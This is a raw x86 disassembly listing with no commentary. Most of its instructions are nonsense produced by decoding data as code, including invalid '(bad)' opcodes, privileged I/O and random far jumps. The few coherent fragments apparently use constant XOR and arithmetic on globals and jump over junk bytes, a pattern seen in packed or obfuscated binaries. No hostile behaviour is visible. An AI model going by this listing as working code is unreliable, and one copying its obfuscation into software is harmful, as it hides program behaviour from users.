  40964c:	jp     0x40964c
  40964e:	or     eax,0x56521e1a
  409653:	popf   
  409654:	jne    0x40965d
  409656:	loope  0x4096a6
  409658:	ror    DWORD PTR [ebp+ecx*8-0x7b],1
  40965c:	sub    al,bh
  40965e:	add    al,0xde
  409660:	imul   edi,DWORD PTR [edi+0x9c95df3],0x76
  409667:	ss or  eax,0x6ef02081
  40966d:	sub    ah,ch
  40966f:	and    DWORD PTR [ebx],ebx
  409671:	or     DWORD PTR [esi+0x5a31e61d],0xef85567
  40967b:	hlt    
  40967c:	jle    0x409645
  40967e:	add    BYTE PTR [esi-0x6a],bh
  409681:	ins    BYTE PTR es:[edi],dx
  409682:	js     0x4096de
  409684:	push   edx
  409685:	inc    esi
  409686:	(bad)  [ecx]
  409688:	int3   
  409689:	pop    esi
  40968a:	sub    al,0xf1
  40968c:	gs clc 
  40968e:	hlt    
  40968f:	scas   al,BYTE PTR es:[edi]
  409690:	pop    ss
  409691:	inc    esi
  409692:	jl     0x409653
  409694:	inc    ebp
  409695:	cmp    eax,0x6466ed9b
  40969a:	out    0x9e,al
  40969c:	sub    al,0x1b
  40969e:	sub    al,0x40
  4096a0:	test   DWORD PTR [ebp+0x4a57c32d],ebp
  4096a6:	fwait
  4096a7:	add    eax,0xf4486f7f
  4096ac:	pop    edi
  4096ad:	inc    edi
  4096ae:	ds inc ebp
  4096b0:	push   edx
  4096b1:	adc    eax,DWORD PTR [ebx+ebx*4+0x52a1094e]
  4096b8:	push   esp
  4096b9:	repz sbb ebx,DWORD PTR [edx-0x38]
  4096bd:	sbb    eax,DWORD PTR [ebx+0x18]
  4096c0:	sub    al,BYTE PTR [eax+esi*4]
  4096c3:	leave  
  4096c4:	rcr    al,cl
  4096c6:	xchg   ecx,eax
  4096c7:	jp     0x409675
  4096c9:	adc    bl,dl
  4096cb:	dec    eax
  4096cc:	test   al,0xe3
  4096ce:	and    dh,BYTE PTR [ebx+0x16efb8ea]
  4096d4:	cmp    bl,BYTE PTR [edi-0x1881b42d]
  4096da:	mov    esi,0xbb7b3df5
  4096df:	out    0xbc,eax
  4096e1:	data16 in al,0x39
  4096e4:	xchg   ecx,eax
  4096e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096e6:	fnstsw WORD PTR [ecx-0xc]
  4096e9:	add    bh,ch
  4096eb:	outs   dx,BYTE PTR ds:[esi]
  4096ec:	jp     0x409745
  4096ee:	cmp    esp,DWORD PTR [edi]
  4096f0:	cld    
  4096f1:	test   DWORD PTR [ebx+0x772254ae],edx
  4096f7:	cdq    
  4096f8:	inc    esi
  4096f9:	pop    es
  4096fa:	imul   ecx,eax,0x2b
  4096fd:	and    eax,edi
  4096ff:	aaa    
  409700:	int3   
  409701:	rcr    DWORD PTR [eax],0xf9
  409704:	les    ebp,FWORD PTR [eax]
  409706:	xchg   edx,eax
  409707:	xor    eax,0x709c7160
  40970c:	ins    BYTE PTR es:[edi],dx
  40970d:	out    dx,eax
  40970e:	xchg   edi,eax
  40970f:	add    DWORD PTR gs:[eax],esp
  409712:	stos   DWORD PTR es:[edi],eax
  409713:	jmp    0x40970b
  409715:	and    al,0x96
  409717:	inc    esi
  409718:	lods   al,BYTE PTR ds:[esi]
  409719:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40971a:	sar    DWORD PTR [ecx+eiz*2+0x239d41ae],0x3
  409722:	dec    edx
  409723:	fwait
  409724:	(bad)  
  409726:	cmp    DWORD PTR [esi],ebx
  409728:	add    BYTE PTR [ebp+0x4f521fe4],dh
  40972e:	rol    BYTE PTR [edx+0x7d38ca8a],cl
  409734:	and    eax,0xf0609dd5
  409739:	push   edx
  40973a:	sbb    dh,BYTE PTR [edx+0x3cf78c2a]
  409740:	adc    BYTE PTR [ebx],dl
  409742:	jo     0x409711
  409744:	add    eax,0xde562ac1
  409749:	push   ebx
  40974a:	xchg   edx,eax
  40974b:	mov    ss,esi
  40974d:	sub    ebx,DWORD PTR [ebx+0x1c]
  409750:	nop
  409751:	out    dx,eax
  409752:	push   ebp
  409753:	repnz and ecx,esp
  409756:	pandn  mm5,QWORD PTR [eax-0x4b082e76]
  40975d:	mov    si,0x4189
  409761:	and    eax,0x1740f44b
  409766:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409767:	dec    ecx
  409768:	inc    ebx
  409769:	sar    DWORD PTR [ecx+0x216f82fb],cl
  40976f:	test   al,0xd5
  409771:	adc    al,0xd
  409773:	loope  0x409753
  409775:	mov    eax,ebp
  409777:	bound  ecx,QWORD PTR [ebx+0x37e76d30]
  40977d:	push   cs
  40977e:	lods   eax,DWORD PTR ds:[esi]
  40977f:	cmp    bh,bl
  409781:	stos   DWORD PTR es:[edi],eax
  409782:	add    BYTE PTR [ebx+0x37],al
  409785:	inc    ecx
  409786:	lock pop es
  409788:	mov    eax,ds:0xd2a7b250
  40978d:	in     al,dx
  40978e:	sub    eax,0x2dc73985
  409793:	mov    dh,0x2a
  409795:	lods   eax,DWORD PTR ds:[esi]
  409796:	sub    BYTE PTR ds:0xc3186b24,0xcb
  40979d:	jmp    0x4097eb
  40979f:	sub    ch,ah
  4097a1:	cdq    
  4097a2:	pushf  
  4097a3:	inc    ebp
  4097a4:	xchg   ebp,eax
  4097a5:	dec    ebp
  4097a6:	fwait
  4097a7:	push   0x4
  4097a9:	cmp    eax,0x4dc92ea8
  4097ae:	inc    edi
  4097af:	add    dl,ch
  4097b1:	outs   dx,DWORD PTR ds:[esi]
  4097b2:	je     0x4097f1
  4097b4:	sar    DWORD PTR [ebx],0xa3
  4097b7:	into   
  4097b8:	mov    edx,0xc95833
  4097bd:	pop    esi
  4097be:	mov    al,0xb5
  4097c0:	sub    eax,0x5bf7b62a
  4097c5:	retf   
  4097c6:	inc    edi
  4097c7:	rcr    esp,0x3c
  4097ca:	sbb    DWORD PTR [edx-0x42],0x5f
  4097ce:	sbb    al,cl
  4097d0:	xchg   edi,eax
  4097d1:	sbb    BYTE PTR [ebp-0x64],dl
  4097d4:	bound  ebp,QWORD PTR [ecx+0x2c]
  4097d7:	jle    0x40979d
  4097d9:	push   ds
  4097da:	shl    DWORD PTR [ebx-0x4fe8eb6c],0x57
  4097e1:	and    al,0xf2
  4097e3:	stos   BYTE PTR es:[edi],al
  4097e4:	add    DWORD PTR [eax-0x8],edi
  4097e7:	mov    DWORD PTR [esi],edi
  4097e9:	outs   dx,BYTE PTR ds:[esi]
  4097ea:	loope  0x4097c7
  4097ec:	fistp  QWORD PTR [edx-0x5bcbcdf8]
  4097f2:	mov    bh,0x1f
  4097f4:	sbb    esp,eax
  4097f6:	inc    edi
  4097f7:	cld    
  4097f8:	dec    DWORD PTR [esi+0x5371b0e1]
  4097fe:	leave  
  4097ff:	pop    ebx
  409800:	and    esp,DWORD PTR [eax+0x3b002d83]
  409806:	mov    gs:0x5a984ede,al
  40980c:	or     DWORD PTR [ebx],ebx
  40980e:	fs sbb bl,0xd3
  409812:	xlat   BYTE PTR ds:[ebx]
  409813:	ins    BYTE PTR es:[edi],dx
  409814:	retf   
  409815:	out    dx,al
  409816:	std    
  409817:	loope  0x409807
  409819:	inc    eax
  40981a:	xor    ecx,DWORD PTR [esi+ebx*4+0x490a3338]
  409821:	add    bl,BYTE PTR ss:0xdeddc33e
  409828:	push   esp
  409829:	loop   0x40989f
  40982b:	xor    ebx,DWORD PTR [ecx-0xd]
  40982e:	cs iret 
  409830:	mov    ds:0x63c55b27,eax
  409835:	lock mov eax,DWORD PTR [ebp-0xc]
  409839:	cmp    eax,ebx
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x4337df
  40986f:	xor    DWORD PTR ds:0x433717,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x4337db,0x4337ab
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x433767,0x433813
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x4336fb
  4098a6:	sub    DWORD PTR ds:0x4337df,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	or     ch,dh
  4098c2:	aad    0x79
  4098c4:	mov    ah,0xd9
  4098c6:	jle    0x409946
  4098c8:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  4098cc:	jmp    0x4098ab
  4098ce:	mov    eax,ds:0x34ce71a8
  4098d3:	push   cs
  4098d4:	call   0x68ab:0xae210701
  4098db:	and    ebx,ecx
  4098dd:	cmp    DWORD PTR [ebx],ebx
  4098df:	mov    esi,0x732e9ca0
  4098e4:	sub    esp,DWORD PTR [ecx-0xabf7d7d]
  4098ea:	loopne 0x409947
  4098ec:	mov    esp,0x60f4c71
  4098f1:	jge    0x40989e
  4098f3:	mov    ch,0x4
  4098f5:	ss call 0x81435e67
  4098fb:	xor    al,0xe4
  4098fd:	hlt    
  4098fe:	adc    BYTE PTR [edx-0x3d],bl
  409901:	sbb    DWORD PTR ss:[edx-0x15],ebp
  409905:	int    0xf7
  409907:	sub    DWORD PTR [eax],eax
  409909:	and    BYTE PTR [ebp+0x29],0xe2
  40990d:	cmc    
  40990e:	xchg   esp,eax
  40990f:	js     0x409953
  409911:	hlt    
  409912:	test   DWORD PTR [ecx+0x42],0x881e51f8
  409919:	mov    ds:0x830b4583,al
  40991e:	pop    DWORD PTR [ebx]
  409920:	ins    DWORD PTR es:[edi],dx
  409921:	cld    
  409922:	rcl    BYTE PTR ds:0x2cc77499,cl
  409928:	xor    DWORD PTR [ebp-0x11],ebp
  40992b:	adc    edx,DWORD PTR [ecx+edx*1]
  40992e:	and    DWORD PTR [ecx+esi*1-0x36],edi
  409932:	jmp    0x49c4:0x689de400
  409939:	pop    eax
  40993a:	push   0xffffffdd
  40993c:	fadd   DWORD PTR ds:0x17c2432f
  409942:	fild   WORD PTR [ebx+0x7a50a1d6]
  409948:	pop    eax
  409949:	test   DWORD PTR [eax+eax*2-0x6553abcf],ebx
  409950:	stc    
  409951:	and    ch,dh
  409953:	int3   
  409954:	out    0xb5,eax
  409956:	cmp    BYTE PTR [edi+eiz*1+0x3f],0xa8
  40995b:	cmp    ah,BYTE PTR [edx-0x52]
  40995e:	cmp    dl,dh
  409960:	test   al,0x1a
  409962:	std    
  409963:	js     0x4099e2
  409965:	icebp  
  409966:	into   
  409967:	xchg   DWORD PTR [ebx],ecx
  409969:	inc    eax
  40996a:	xor    edx,DWORD PTR [ebp-0x7a]
  40996d:	inc    edx
  40996e:	hlt    
  40996f:	ret    
  409970:	pop    esp
  409971:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409972:	dec    edi
  409973:	pop    ecx
  409974:	push   0xbbe162a1
  409979:	push   ebp
  40997a:	mov    ebp,0xdeecd86f
  40997f:	add    dl,BYTE PTR [ebx+eax*8]
  409982:	mov    ss,WORD PTR [edi-0x5d]
  409985:	push   0x4821deeb
  40998a:	mov    ch,0x91
  40998c:	das    
  40998d:	cmp    BYTE PTR [ebx-0x3d],0xa
  409991:	jg     0x409921
  409993:	mov    cs:0x64a1cc07,eax
  409999:	fisttp QWORD PTR [ebp-0x22cd0fe9]
  40999f:	jge    0x4099e4
  4099a1:	add    BYTE PTR ds:0x6c1233ab,al
  4099a7:	test   al,0x43
  4099a9:	inc    ecx
  4099aa:	sub    al,BYTE PTR ss:[eax-0x5]
  4099ae:	(bad)  
  4099af:	mov    ds:0xbf79fc8c,eax
  4099b4:	nop
  4099b5:	adc    dh,BYTE PTR [esp+edx*1-0x7b]
  4099b9:	out    0x8a,al
  4099bb:	cmp    al,0x76
  4099bd:	ror    DWORD PTR [ebp+ebx*2+0x4b],0x53
  4099c2:	das    
  4099c3:	cmp    BYTE PTR [ebx-0xd],0x10
  4099c7:	mov    edi,0x998625e6
  4099cc:	pop    ebx
  4099cd:	mov    cl,0xef
  4099cf:	add    eax,DWORD PTR [edx]
  4099d1:	push   eax
  4099d2:	(bad)  
  4099d3:	xchg   edx,eax
  4099d4:	jo     0x4099df
  4099d6:	push   ss
  4099d7:	call   0xebd9:0x33d9526a
  4099de:	xchg   ecx,eax
  4099df:	sub    edx,DWORD PTR [ecx-0x57de8a2c]
  4099e5:	mov    bl,0xbf
  4099e7:	test   ch,ch
  4099e9:	leave  
  4099ea:	add    BYTE PTR [edi+edi*4],cl
  4099ed:	jno    0x409a09
  4099ef:	push   eax
  4099f0:	mov    bl,0xf4
  4099f2:	je     0xb3acc1bc
  4099f8:	add    ebp,DWORD PTR [eax+0x21]
  4099fb:	cs js  0x409a56
  4099fe:	inc    ebp
  4099ff:	push   esp
  409a00:	sets   BYTE PTR [ecx-0x4d8ef0d]
  409a07:	iret   
  409a08:	retf   0x831a
  409a0b:	pop    ebx
  409a0c:	shl    BYTE PTR [eax+0x28e3aef3],0xa8
  409a13:	xor    edi,DWORD PTR [esi]
  409a15:	push   ss
  409a16:	add    eax,0xe7ce571f
  409a1b:	ins    BYTE PTR es:[edi],dx
  409a1c:	(bad)  
  409a1d:	scas   eax,DWORD PTR es:[edi]
  409a1e:	das    
  409a1f:	xor    DWORD PTR [esp+eax*4],0x7ac09ea1
  409a26:	add    dh,bl
  409a28:	dec    esi
  409a29:	lea    eax,[esi+edi*1]
  409a2c:	push   edx
  409a2d:	lods   eax,DWORD PTR ds:[esi]
  409a2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a2f:	std    
  409a30:	jns    0x409a2b
  409a32:	inc    esi
  409a33:	repnz add BYTE PTR [edi-0x2e],bl
  409a37:	mov    cl,0x17
  409a39:	cmp    BYTE PTR [ecx+0x2c],ch
  409a3c:	xor    DWORD PTR [esi+0x3c],0x75
  409a40:	sub    BYTE PTR [edx],ch
  409a42:	mov    esp,DWORD PTR [ebx+0x40ea7253]
  409a48:	out    0xd5,al
  409a4a:	mov    bh,0x87
  409a4c:	inc    ebp
  409a4d:	inc    edi
  409a4e:	mov    esp,0x172d5546
  409a53:	and    DWORD PTR [eax-0x1f6637d9],0x7e
  409a5a:	mov    es,esp
  409a5c:	rcpps  xmm2,XMMWORD PTR [esi+0x42247db2]
  409a63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a64:	fprem  
  409a66:	xchg   edx,eax
  409a67:	out    0xe2,al
  409a69:	mov    ecx,0xfe19ea9e
  409a6e:	ret    
  409a6f:	sub    cl,BYTE PTR [esi+0x5f]
  409a72:	push   ss
  409a73:	cld    
  409a74:	push   ecx
  409a75:	clc    
  409a76:	pop    edx
  409a77:	adc    eax,DWORD PTR [esi]
  409a79:	add    al,0x53
  409a7b:	mov    eax,0x84d9295c
  409a80:	sub    al,0xe9
  409a82:	push   cs
  409a83:	(bad)  
  409a84:	jno    0x409abf
  409a86:	popf   
  409a87:	mov    BYTE PTR ds:[esi],al
  409a8a:	pusha  
  409a8b:	test   BYTE PTR [ebp-0x29],0x8f
  409a8f:	addr16 cmp al,0xe
  409a92:	(bad)  
  409a93:	fsub   st,st(0)
  409a95:	push   esp
  409a96:	push   ebp
  409a97:	cmp    edi,DWORD PTR [ebx+0x2e44ea1c]
  409a9d:	call   0x32c8:0x98e15071
  409aa4:	inc    ebp
  409aa5:	dec    edx
  409aa6:	(bad)  
  409aa7:	int    0x49
  409aa9:	dec    edx
  409aaa:	mov    ah,0x7c
  409aac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409aad:	dec    eax
  409aae:	outs   dx,BYTE PTR ds:[esi]
  409aaf:	cmp    BYTE PTR [ebp-0x253fe7ae],ch
  409ab5:	add    DWORD PTR ds:0xf612a45f,eax
  409abb:	sbb    DWORD PTR [eax],eax
  409abd:	cmp    dh,BYTE PTR [eax-0xa673d04]
  409ac3:	int    0x6d
  409ac5:	mov    al,0x8
  409ac7:	sahf   
  409ac8:	ss sub al,0x90
  409acb:	sub    al,0x6
  409acd:	push   edi
  409ace:	xchg   edi,eax
  409acf:	in     eax,0x1c
  409ad1:	jl     0x409a86
  409ad3:	in     al,0x0
  409ad5:	iret   
  409ad6:	mov    esi,0xc95eab90
  409adb:	fsubr  st(2),st
  409add:	pop    esi
  409ade:	mov    ds:0x2726d971,al
  409ae3:	test   DWORD PTR [ecx-0x62075735],esi
  409ae9:	test   al,0xf0
  409aeb:	ret    0x1c41
  409aee:	sbb    DWORD PTR [ebx+ebp*1-0x32d0787e],esi
  409af5:	pop    esp
  409af6:	cmp    DWORD PTR [ebp+0x77],esp
  409af9:	jo     0x409b02
  409afb:	pop    edi
  409afc:	mov    al,ds:0xeaa38275
  409b01:	dec    ebp
  409b02:	stc    
  409b03:	call   0x4e5:0xdd47e66b
  409b0a:	and    eax,0x65d49811
  409b0f:	mov    ebp,0x57569b69
  409b14:	sbb    DWORD PTR ds:0x43379f,0x433753
  409b1e:	jmp    0x409d81
  409b23:	lds    esp,FWORD PTR [edi-0x2e932d54]
  409b29:	popa   
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi-0x1600382c]
  409b32:	xchg   BYTE PTR [esi-0x1c],bh
  409b35:	jle    0x409bb5
  409b37:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409b3b:	and    edx,edi
  409b3d:	inc    ebx
  409b3e:	shr    DWORD PTR [edx],cl
  409b40:	mov    eax,0x9f6714f1
  409b45:	xor    eax,0x2d984eac
  409b4a:	xchg   ecx,eax
  409b4b:	into   
  409b4c:	or     BYTE PTR [esi],bl
  409b4e:	mov    DWORD PTR [ecx],esp
  409b50:	popa   
  409b51:	hlt    
  409b52:	ss loope 0x409b8a
  409b55:	int    0x36
  409b57:	jmp    0x409ba3
  409b59:	loop   0x409b6a
  409b5b:	in     al,0xc3
  409b5d:	mov    ecx,0xf568309
  409b62:	aas    
  409b63:	sub    BYTE PTR [ebx+0x45a0d4c4],bh
  409b69:	leave  
  409b6a:	in     eax,dx
  409b6b:	inc    esi
  409b6c:	inc    esi
  409b6d:	stos   DWORD PTR es:[edi],eax
  409b6e:	and    eax,0x65e848e4
  409b73:	ja     0x409b8f
  409b75:	nop
  409b76:	mov    fs,WORD PTR [edx-0x53]
  409b79:	sbb    eax,0x5f230792
  409b7e:	cmc    
  409b7f:	dec    ebx
  409b80:	push   esp
  409b81:	fmul   DWORD PTR [ecx+0x53]
  409b84:	in     eax,0xa4
  409b86:	es call 0x95090866
  409b8c:	xor    BYTE PTR [eax-0x3234b3ae],cl
  409b92:	xlat   BYTE PTR ds:[ebx]
  409b93:	ret    0xb7fd
  409b96:	ins    BYTE PTR es:[edi],dx
  409b97:	rol    BYTE PTR [edx-0xa],cl
  409b9a:	int    0x8f
  409b9c:	adc    esp,edi
  409b9e:	mov    DWORD PTR [edi-0x60],edx
  409ba1:	lods   eax,DWORD PTR ds:[esi]
  409ba2:	inc    ecx
  409ba3:	jb     0x409b42
  409ba5:	ins    DWORD PTR es:[edi],dx
  409ba6:	cli    
  409ba7:	repz xor eax,0xa4374606
  409bad:	mov    bh,0xa4
  409baf:	mov    ch,0x96
  409bb1:	jmp    0x902ba62
  409bb6:	xchg   BYTE PTR [ecx],ah
  409bb8:	add    al,BYTE PTR [ecx]
  409bba:	xor    DWORD PTR ds:0xa256d8fc,esi
  409bc0:	les    edx,FWORD PTR [eax-0x37121068]
  409bc6:	loope  0x409b4d
  409bc8:	fld    DWORD PTR [esi+0x69]
  409bcb:	sbb    BYTE PTR [edx+0x3a],dh
  409bce:	mov    esi,0x1b9cc3c3
  409bd3:	xchg   ebp,eax
  409bd4:	cmp    eax,0xcbedbd94
  409bd9:	mov    es,WORD PTR [edx+0x7c4dd51b]
  409bdf:	push   ds
  409be0:	sub    BYTE PTR [edx-0x51d9e8f6],bl
  409be6:	mov    ebx,0x6a6942fd
  409beb:	mov    ds:0x73474a15,al
  409bf0:	stos   BYTE PTR es:[edi],al
  409bf1:	xchg   esp,eax
  409bf2:	data16 add al,0x5d
  409bf5:	hlt    
  409bf6:	xor    al,0xf8
  409bf8:	dec    ebx
  409bf9:	pop    eax
  409bfa:	cmp    edx,0x186574b5
  409c00:	je     0x409b9a
  409c02:	cs sar edi,0x3c
  409c06:	out    dx,al
  409c07:	sbb    edi,edx
  409c09:	sub    edx,DWORD PTR [eax+0x39]
  409c0c:	cmp    DWORD PTR [eax-0x1e],ebp
  409c0f:	je     0x409c2e
  409c11:	inc    edi
  409c12:	mov    ecx,0x25cfa5a7
  409c17:	pusha  
  409c18:	std    
  409c19:	leave  
  409c1a:	fild   WORD PTR [ecx+0x1f]
  409c1d:	stc    
  409c1e:	jbe    0x409c19
  409c20:	(bad)  fs:[edx-0x233fcee5]
  409c27:	or     cl,BYTE PTR ds:0xc7e29a4a
  409c2d:	jae    0x409c71
  409c2f:	jp     0x409bef
  409c31:	cmp    bl,al
  409c33:	jp     0x409c98
  409c35:	dec    edi
  409c36:	and    bl,BYTE PTR [edx-0x79ce9633]
  409c3c:	xchg   edx,eax
  409c3d:	mov    ?,WORD PTR [esp+esi*8+0x790d6462]
  409c44:	or     eax,0xe9e5665c
  409c49:	adc    al,0xa4
  409c4b:	mov    dh,0x2f
  409c4d:	sti    
  409c4e:	mov    cl,0x3e
  409c50:	inc    edi
  409c51:	mov    ch,0xed
  409c53:	mov    ecx,0xa529c685
  409c58:	rol    DWORD PTR [esi-0x64],cl
  409c5b:	mov    ebx,0xc20067b4
  409c60:	mov    ah,BYTE PTR [ebp-0x3c78ac68]
  409c66:	sbb    ebx,DWORD PTR [eax+0x21]
  409c69:	xchg   BYTE PTR [ecx],cl
  409c6b:	jecxz  0x409c02
  409c6d:	in     al,0x4f
  409c6f:	cmp    edi,DWORD PTR [eax-0x453e2d75]
  409c75:	xor    eax,0x1f72c453
  409c7a:	les    ebp,FWORD PTR [edx+edx*4-0x2930da46]
  409c81:	add    al,0x89
  409c83:	mov    ds:0x97bf487f,al
  409c88:	mul    DWORD PTR [esi]
  409c8a:	mov    edi,0xcfcf0a51
  409c8f:	ins    BYTE PTR es:[edi],dx
  409c90:	sahf   
  409c91:	dec    esp
  409c92:	mov    ds:0xa7cd0c81,al
  409c97:	hlt    
  409c98:	xchg   esi,eax
  409c99:	mov    ah,0x22
  409c9b:	(bad)  
  409c9c:	bswap  ebx
  409c9e:	out    dx,al
  409c9f:	shr    bl,1
  409ca1:	push   edx
  409ca2:	inc    esi
  409ca3:	mov    edi,0x276c513f
  409ca8:	lahf   
  409ca9:	aam    0xe7
  409cab:	lds    ebx,FWORD PTR [esi]
  409cad:	stos   BYTE PTR es:[edi],al
  409cae:	aad    0xbf
  409cb0:	add    BYTE PTR [edi-0x38bb549b],ah
  409cb6:	sbb    dh,dh
  409cb8:	push   esi
  409cb9:	into   
  409cba:	dec    edi
  409cbb:	lea    esp,[edx+0x4606bd65]
  409cc1:	mov    al,0xc1
  409cc3:	fcomp  DWORD PTR [edx-0x70]
  409cc6:	push   eax
  409cc7:	popf   
  409cc8:	mov    edx,0x9f11bb53
  409ccd:	sub    ch,BYTE PTR [eax+0x56]
  409cd0:	mov    ds:0xef88e67,eax
  409cd5:	inc    esp
  409cd7:	cs (bad) 
  409cd9:	out    0x66,eax
  409cdb:	cmp    dh,0xa1
  409cde:	fidivr WORD PTR [edi]
  409ce0:	xor    eax,DWORD PTR [esi+0x36d44680]
  409ce6:	push   es
  409ce7:	cmc    
  409ce8:	or     bh,0x86
  409ceb:	inc    esi
  409cec:	leave  
  409ced:	scas   al,BYTE PTR es:[edi]
  409cee:	xchg   ebx,eax
  409cef:	lods   eax,DWORD PTR ds:[esi]
  409cf0:	pop    edx
  409cf1:	and    DWORD PTR [edi-0x4a],esp
  409cf4:	test   BYTE PTR [edx-0x67],al
  409cf7:	shl    ecx,0x77
  409cfa:	mov    ah,0x44
  409cfc:	cwde   
  409cfd:	ret    
  409cfe:	loop   0x409d60
  409d00:	sub    eax,0x23d31007
  409d05:	daa    
  409d06:	sub    BYTE PTR [edi-0x1c],cl
  409d09:	or     al,0x30
  409d0b:	mov    eax,0x4a10ea7d
  409d10:	mov    ch,0x8e
  409d12:	clc    
  409d13:	bound  edx,QWORD PTR [edi+0x7abe4328]
  409d19:	jno    0x409d2d
  409d1b:	dec    esi
  409d1c:	push   0xffffff88
  409d1e:	pop    ebp
  409d1f:	sbb    al,0x53
  409d21:	sti    
  409d22:	sti    
  409d23:	xchg   edi,eax
  409d24:	(bad)  
  409d25:	repz sahf 
  409d27:	fwait
  409d28:	inc    esi
  409d29:	xchg   esp,eax
  409d2a:	sbb    esp,edx
  409d2c:	je     0x409cf2
  409d2e:	bound  edi,QWORD PTR [esi-0x482a2d7]
  409d34:	das    
  409d35:	jl     0x409ce6
  409d37:	sbb    eax,0x1a0fb1c4
  409d3c:	rol    BYTE PTR [ebx+0xd2a2a84],1
  409d42:	push   ecx
  409d43:	icebp  
  409d44:	jmp    0x409d0b
  409d46:	mov    esi,0x13324f3f
  409d4b:	or     eax,0x5eadbf16
  409d50:	mov    dl,BYTE PTR [ebp+0x7107688a]
  409d56:	(bad)  
  409d58:	push   esi
  409d59:	int    0xc4
  409d5b:	nop
  409d5c:	and    al,0xc7
  409d5e:	add    DWORD PTR [eax-0x4c],ebx
  409d61:	mov    edx,0x4939e0b9
  409d66:	or     dl,bl
  409d68:	pop    edi
  409d69:	jns    0x409d72
  409d6b:	test   ch,ch
  409d6d:	in     eax,dx
  409d6e:	adc    BYTE PTR [esi+0x3],ah
  409d71:	addr16 (bad) 
  409d73:	mov    dl,0x9c
  409d75:	and    BYTE PTR [ebx-0x1e],dh
  409d78:	or     bh,BYTE PTR [ebp-0x36d8fa7a]
  409d7e:	stc    
  409d7f:	test   DWORD PTR [esi+0x5c7c985],esp
  409d85:	pop    ss
  409d86:	aaa    
  409d87:	inc    ebx
  409d88:	add    bh,ah
  409d8a:	xor    al,0x0
  409d8c:	add    BYTE PTR [edi],cl
  409d8e:	test   BYTE PTR [eax+eax*1],dl
  409d91:	add    BYTE PTR [eax],al
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43370b
  409d9c:	sub    DWORD PTR ds:0x4337df,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x433753,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	and    eax,0x387d5fbd
  409dc3:	loop   0x409e43
  409dc5:	jle    0x409dff
  409dc7:	jl     0x409e47
  409dc9:	jle    0x409e12
  409dcb:	ret    
  409dcc:	lahf   
  409dcd:	xor    eax,0x93563d5c
  409dd2:	mov    DWORD PTR [ebx-0xe],0x79bf20a5
  409dd9:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  409ddb:	in     al,dx
  409ddc:	fs or  esi,edi
  409ddf:	fcomi  st,st(2)
  409de1:	inc    eax
  409de2:	fcmovnu st,st(2)
  409de4:	icebp  
  409de5:	inc    eax
  409de6:	inc    esp
  409de7:	aaa    
  409de8:	sbb    ah,BYTE PTR [ecx-0x679c5236]
  409dee:	(bad)  
  409df0:	fmulp  st(3),st
  409df2:	ins    DWORD PTR es:[edi],dx
  409df3:	xchg   edx,eax
  409df4:	not    BYTE PTR ds:0x5641f04f
  409dfa:	fsubr  QWORD PTR [eax]
  409dfc:	inc    ecx
  409dfd:	jmp    0xbc58:0x6a9e62a
  409e04:	jecxz  0x409e65
  409e06:	pop    edx
  409e07:	nop
  409e08:	pcmpeqb mm1,QWORD PTR [ebx+0x75a9e49b]
  409e0f:	nop
  409e10:	push   0x6f499c95
  409e15:	icebp  
  409e16:	jno    0x409df3
  409e18:	xchg   dh,cl
  409e1a:	adc    ch,cl
  409e1c:	or     al,0x3e
  409e1e:	push   esi
  409e1f:	jmp    0x409e43
  409e21:	icebp  
  409e22:	es (bad) 
  409e24:	xor    eax,0x19ec324f
  409e29:	add    DWORD PTR [ebx],edi
  409e2b:	dec    edi
  409e2c:	sbb    ch,BYTE PTR [ebp+edx*8+0x65]
  409e30:	sbb    eax,0xd9ce4c63
  409e35:	add    eax,0x93389084
  409e3a:	popa   
  409e3b:	and    DWORD PTR [eax+0x72101ee8],ebp
  409e41:	jmp    0x4423b93d
  409e46:	imul   eax,eax,0xffffffcd
  409e49:	clc    
  409e4a:	inc    esi
  409e4b:	les    esp,FWORD PTR [esp+edi*4]
  409e4e:	dec    edx
  409e4f:	xchg   ebp,eax
  409e50:	rol    BYTE PTR [ebx+0x124ae3d2],cl
  409e56:	push   ecx
  409e57:	mov    esi,0x6dac95fd
  409e5c:	imul   BYTE PTR [ecx]
  409e5e:	mov    bl,0x56
  409e60:	popf   
  409e61:	jg     0x409eba
